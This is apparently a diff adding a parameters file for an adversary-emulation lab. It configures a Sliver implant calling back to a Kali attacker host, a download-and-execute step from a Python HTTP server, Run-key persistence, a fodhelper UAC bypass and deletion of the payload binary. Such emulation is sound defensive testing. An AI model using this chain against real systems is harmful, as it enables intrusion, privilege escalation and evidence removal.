@@ -1,0 +1,67 @@
+# Aurora attack-chain parameters file — chain-003-fixed (env0)
+#
+# Chain narrative:
+#   sliver-implant EXE payload → victim downloads and runs it
+#   (non-elevated Sliver session) → whoami discovery → derive PS
+#   session (dead code after VSS surgery, kept for chain-shape
+#   fidelity — see NOTES.txt) → derive cmd session → reg-key-run
+#   persistence (HKCU, non-elevated) → **fodhelper UAC bypass (cmd
+#   variant, one of today's new PrivEsc actions)** re-launches the
+#   same payload elevated → elevated Sliver session established →
+#   sliver-rm wipes the payload binary (defense evasion / impact).
+#
+#   Original chain-003 had art-t1003_002-io-file-vss-hive credential
+#   dump + downstream download; both removed in -fixed after parking
+#   the VSS-family actions on 2026-07-13. sliver-rm originally
+#   cleaned up the VSS hive dump (via string2_var_in_plan); after the
+#   surgery + the source pddl_index fix on sliver-rm (2026-07-14) it
+#   was repointed to string1_var_in_plan so it wipes the sliver
+#   payload binary instead — realistic post-elevation forensic
+#   cleanup. See NOTES.txt and emulation_plan_details.manual_edits.
+#
+# Attacker: Kali at 192.168.56.43 with a running sliver-server
+# Victim:   Windows VM (any IP)
+
+pddl_bindings:
+  # used by: 1_sliver-payload-windows-exe.SAVE_PATH
+  # Attacker-side path for the sliver EXE output.
+  string0_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.exe
+
+  # used by: 2_simulate-download-execute-file.SAVE_PATH,
+  #          8_art-t1548_002-fodhelper-uac-bypass-cmd.EXE_PATH,
+  #          10_sliver-rm.RemotePath
+  # Victim-side path for the payload — downloaded at step 2,
+  # re-launched elevated by fodhelper at step 8, wiped at step 10.
+  # Same file across all three uses (one on-disk binary threaded
+  # through the entire post-landing arc).
+  string1_var_in_plan: C:\Users\Public\chain_sl.exe
+
+  # used by: 7_art-t1547_001-reg-key-run.command_to_execute
+  # Command written into HKCU\...\Run for persistence at next login.
+  # Notepad is a benign / always-present binary that verifies the
+  # reg-key-run mechanism (registry write completes, next-login
+  # handoff wired) without depending on the sliver payload staying
+  # on disk (step 10 wipes that binary). A real attacker chain
+  # would point this at a persistence binary staged in a
+  # different, non-wiped location.
+  string3_var_in_plan: C:\Windows\System32\notepad.exe
+
+steps:
+  "1_sliver-payload-windows-exe":
+    LHOST: 192.168.56.43       # attacker IP baked into sliver implant
+    LPORT: 8443                # sliver's default mtls listener port
+
+  "2_simulate-download-execute-file":
+    LHOST: 192.168.56.43       # attacker's HTTP server IP
+    LPORT: 8000                # `python -m http.server 8000` on Kali
+
+  "7_art-t1547_001-reg-key-run":
+    value_name: 'AuroraChainPersist'   # human-visible reg value name;
+                                       # keep something distinguishable
+                                       # for later manual verification
+
+  "10_sliver-rm":
+    Recursive: false           # single file, not a directory
+    Force: true                # no interactive confirm
+                               # (RemotePath comes from pddl_bindings
+                               #  string1_var_in_plan above)
